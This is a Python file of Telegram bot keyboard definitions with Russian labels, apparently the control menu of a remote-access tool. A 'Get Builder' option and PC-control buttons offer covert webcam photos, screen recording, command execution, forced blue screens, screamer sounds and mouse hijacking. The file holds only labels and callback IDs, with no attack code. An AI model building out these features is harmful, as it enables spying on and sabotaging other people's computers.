main_keyboard = [
    '🛠️ Админ панель',
    'ℹ️ Личная информация',
    '⚙️ Моя OC (Операционная Система)',
    '👨‍💻 Тех. Поддержка.',
    '📝 Получить Builder',
    '📝 Пользовательское соглашения',
    '🔛 Подключиться к 🖥️',
    '📴 Закрыть соединение с 🖥️',
]

admin_keyboard = [
    ("‍🧑‍Рассылка", "broadcast_message"),
    ("🧑‍💼Добавить нового админа", "new_admin_data"),
    ("❌Удалить админа", "remove_admin_list_data"),
    ("📈Добавить новую группу для подписки", "add_new_group_username_data"),
    ("📉Удалить группу", "delete_group_data"),
    ("📁Список групп", "list_group_data"),
    ("🧑Cписок администрации", "database_list_admin_data"),
    ("🧑‍💼Получить ID пользователя", "get_player_id"),
]

back_keyboard = [
    ("🔙Назад", "back_data2"),
]

https_url = "https://t.me/"
info_keyboard = [
    ("Технический администратор", f"{https_url}timaadev"),
    ("Предложения и идеи", f"{https_url}timaadev"),
    ("Владелец бота", f"{https_url}timaadev"),
]

connected_keyboard = [
    ("Подключиться", "connect_data"),
]

keyboard_check_is_control = [
    ("Управление браузером", "control_browser"),
    ("Управление Youtube", "control_youtube"),
    ("Управление Компьютером", "control_pc"),
]

keyboard_control_pc = [
    ("Назад", "back_data"),
    ("Очистить корзину", "clear_сart"),
    ("Завершение работы", "shutdown_data"),
    ("Перезагрузка", "reload_data"),
    ("Блокировка экрана", "lock_screen_data"),
    ("Открывание BSOD картин в браузере", "bsod_screen_brows_data"),
    ("Вызвать синий экран смерти", "blue_screen_of_dead"),
    ("Фотография пользователя", "screenshot_user_data"),
    ("Скриншот рабочего стола", "screenshot_screen_data"),
    ("Запись рабочего стола", "recording_screen_data"),
    ("Свернуть все окна", "hide_all_windows_data"),
    ("Установить максимальную громкость", "max_volume_data"),
    ("Сример звуком", "screamer_song_data"),
    ("Управление мышкой", "control_mouse_data"),
    ("Состояние комплектующих", "system_info_data"),
    ("Включить/Выключить звук Компьютера", "turn_on_and_off_volume"),
    ("Выполнить команду", "send_command_data"),
]

screen_recording_keyboard = [
    ("Начать запись", "start_record_data"),
    ("Остановить запись", "stop_record_data"),
]

random_cursor_keyboard = [
    ("Включить перемещение курсора", "random_cursor_start_data"),
    ("Остановить перемещение курсора", "random_cursor_stop_data"),
    ("Scroll верх", "scroll_up_data"),
    ("Scroll вниз", "scroll_down_data"),
]

# ("Камера", "camera_data"),
# ("Сменить язык", "change_language_data"),

keyboard_control_youtube = [
    ("Назад", "back_data"),
    ("Открыть Youtube", "open_youtube_data"),
    ("Включить/Выключить видео", "on_and_stop_video_data"),
    ("Регулировка громкости", "adjustment_volume_data"),
    ("Обновить страницу Youtube", "reload_youtube_data"),
    ("Закрыть Youtube", "close_youtube_data"),
]
